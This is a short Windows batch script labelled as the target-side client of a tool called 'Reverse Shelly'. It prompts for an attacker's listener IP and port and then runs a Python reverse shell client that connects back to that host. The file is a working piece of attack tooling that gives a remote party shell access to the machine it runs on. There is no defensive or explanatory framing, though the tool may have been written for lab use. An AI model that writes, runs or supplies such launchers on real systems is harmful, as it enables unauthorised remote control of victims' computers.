@echo off
title Reverse Shelly - Client
echo ========================================
echo   Reverse Shelly - Client (Target)
echo ========================================
echo.
cd /d "%~dp0Reverse Shelly"

set /p ATTACKER_IP="Enter listener IP address: "
set /p ATTACKER_PORT="Enter listener port: "

echo.
echo Connecting to %ATTACKER_IP%:%ATTACKER_PORT%...
echo.
python reverse_shell_client.py %ATTACKER_IP% %ATTACKER_PORT%

pause
